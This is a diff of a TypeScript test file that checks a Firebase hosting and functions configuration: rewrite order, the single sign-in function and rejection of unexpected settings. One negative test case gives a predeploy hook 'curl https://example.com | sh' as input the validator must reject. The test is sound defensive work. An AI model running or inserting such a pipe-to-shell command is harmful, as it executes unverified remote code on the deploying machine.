@@ -3,7 +3,9 @@ import { join } from 'node:path';
 import { minimatch } from 'minimatch';
 import { describe, expect, it } from 'vitest';
 import {
+  API_REWRITE,
   cspHeaderProblems,
+  EXPECTED_FUNCTIONS,
   firebaseJsonProblems,
   firebasercProblems,
   ignoreProblems,
@@ -31,11 +33,14 @@ const read = (path: string) => readFileSync(join(ROOT, path), 'utf8');
 interface Hosting {
   public: string;
   ignore: string[];
-  rewrites: { source: string; destination: string }[];
+  rewrites: { source: string; destination?: string; function?: unknown }[];
   headers: { source: string; headers: { key: string; value: string }[] }[];
 }
 
-const firebaseJson = JSON.parse(read('firebase.json')) as { hosting: Hosting[] };
+const firebaseJson = JSON.parse(read('firebase.json')) as {
+  hosting: Hosting[];
+  functions?: unknown;
+};
 const firebaserc = JSON.parse(read('.firebaserc'));
 const indexHtml = read('apps/web/index.html');
 
@@ -54,15 +59,25 @@ const packageFiles = [
 const [web] = firebaseJson.hosting;
 const header = (source: string, key: string) =>
   web?.headers.find((rule) => rule.source === source)?.headers.find((h) => h.key === key)?.value;
-const rewritten = (path: string) =>
-  (web?.rewrites ?? []).some((rule) => minimatch(path, rule.source));
+/** The rule Hosting applies to `path`: the first that matches, as Hosting reads them. */
+const ruleFor = (path: string) =>
+  (web?.rewrites ?? []).find((rule) => minimatch(path, rule.source));
+const rewritten = (path: string) => ruleFor(path)?.destination === '/index.html';
 
 const DIST = join(ROOT, 'apps/web/dist');
 
 describe('the web build hosting config, as committed', () => {
-  it('deploys only through the web target', () => {
+  it('deploys only through the web target, and the one sign-in function codebase', () => {
     expect(firebaseJsonProblems(firebaseJson)).toEqual([]);
     expect(firebasercProblems(firebaserc)).toEqual([]);
+    expect(firebaseJson.functions).toEqual(EXPECTED_FUNCTIONS);
+  });
+
+  it('sends /api/** to the sign-in function and nothing else there (#663)', () => {
+    expect(web?.rewrites[0]).toEqual(API_REWRITE);
+    for (const path of ['/api/auth/token', '/api/auth/start', '/api/anything/else'])
+      expect([path, ruleFor(path)]).toEqual([path, API_REWRITE]);
+    expect(web?.rewrites.filter((rule) => rule.function !== undefined)).toHaveLength(1);
   });
 
   it('deploys with exactly the allowed workflow', () => {
@@ -89,11 +104,13 @@ describe('the web build hosting config, as committed', () => {
 
   it('serves the web build as a single-page app, but lets a missing asset 404', () => {
     expect(web?.public).toBe('apps/web/dist');
-    expect(web?.rewrites.every((rule) => rule.destination === '/index.html')).toBe(true);
-    expect(['/notes', '/notes/a/b', '/today'].filter(rewritten)).toEqual([
+    expect(web?.rewrites.slice(1).every((rule) => rule.destination === '/index.html')).toBe(true);
+    expect(['/notes', '/notes/a/b', '/today', '/auth/callback', '/api'].filter(rewritten)).toEqual([
       '/notes',
       '/notes/a/b',
       '/today',
+      '/auth/callback',
+      '/api',
     ]);
     // Rewritten, the page would be served under the assets' year-long cache.
     expect(['/assets/index-gone.js', '/assets/a/b.css'].filter(rewritten)).toEqual([]);
@@ -164,11 +181,97 @@ describe('firebase.json', () => {
     ],
     ['has a second target', { hosting: [{ target: 'web' }, { target: 'other' }] }, '"other"'],
     ['has no target', { hosting: [{ public: 'x' }] }, 'target "undefined"'],
-    ['configures functions too', { hosting: { target: 'web' }, functions: {} }, '"functions"'],
+    [
+      'configures functions as nothing',
+      { hosting: { target: 'web' }, functions: {} },
+      '"functions"',
+    ],
+    [
+      'configures another codebase',
+      { hosting: { target: 'web' }, functions: [{ ...EXPECTED_FUNCTIONS[0], codebase: 'other' }] },
+      '"functions"',
+    ],
+    [
+      'configures the codebase from another folder',
+      { hosting: { target: 'web' }, functions: [{ ...EXPECTED_FUNCTIONS[0], source: 'apps/mcp' }] },
+      '"functions"',
+    ],
+    [
+      'runs a command before deploying the function',
+      {
+        hosting: { target: 'web' },
+        functions: [{ ...EXPECTED_FUNCTIONS[0], predeploy: ['curl https://example.com | sh'] }],
+      },
+      '"functions"',
+    ],
+    [
+      'configures a second codebase beside it',
+      {
+        hosting: { target: 'web' },
+        functions: [...EXPECTED_FUNCTIONS, { codebase: 'x', source: 'x' }],
+      },
+      '"functions"',
+    ],
+    [
+      'configures the function as a single entry, not the list',
+      { hosting: { target: 'web' }, functions: EXPECTED_FUNCTIONS[0] },
+      '"functions"',
+    ],
+    [
+      'configures Firestore beside them',
+      { hosting: { target: 'web' }, functions: EXPECTED_FUNCTIONS, firestore: {} },
+      '"firestore"',
+    ],
     ['has no hosting', {}, 'no hosting entry'],
     ['has an empty hosting list', { hosting: [] }, 'empty hosting list'],
   ])('fails when it %s', (_what, config, problem) => {
     expect(firebaseJsonProblems(config)).toEqual([expect.stringContaining(problem)]);
+  });
+});
+
+describe('the hosting rewrites', () => {
+  const page = { source: '**', destination: '/index.html' };
+  const withRewrites = (rewrites: unknown) => ({ hosting: { target: 'web', rewrites } });
+
+  it('pass the API rewrite first and the page after', () => {
+    expect(firebaseJsonProblems(withRewrites([API_REWRITE, page]))).toEqual([]);
+    expect(firebaseJsonProblems(withRewrites([page]))).toEqual([]);
+  });
+
+  it.each([
+    ['put the API rewrite after the page', [page, API_REWRITE], 'not the first'],
+    [
+      'send /api/** to another function',
+      [{ source: '/api/**', function: { functionId: 'other', region: 'us-central1' } }],
+      'rewrite 1',
+    ],
+    [
+      'send the API rewrite to another region',
+      [{ source: '/api/**', function: { functionId: 'auth', region: 'europe-west1' } }],
+      'rewrite 1',
+    ],
+    [
+      'send another path to the function',
+      [{ source: '/admin/**', function: API_REWRITE.function }],
+      'rewrite 1',
+    ],
+    ['send a path to Cloud Run', [{ source: '/x/**', run: { serviceId: 's' } }], 'rewrite 1'],
+    ['use Dynamic Links', [{ source: '/l/**', dynamicLinks: true }], 'rewrite 1'],
+    [
+      'rewrite to another site',
+      [{ source: '**', destination: 'https://dailyflowai-app.web.app/' }],
+      'rewrite 1',
+    ],
+    [
+      'add a key to a page rewrite',
+      [{ source: '**', destination: '/index.html', function: 'auth' }],
+      'rewrite 1',
+    ],
+    ['are not a list', { source: '**' }, 'not a list'],
+  ])('fail when they %s', (_what, rewrites, problem) => {
+    expect(firebaseJsonProblems(withRewrites(rewrites))).toEqual([
+      expect.stringContaining(problem),
+    ]);
   });
 });
 
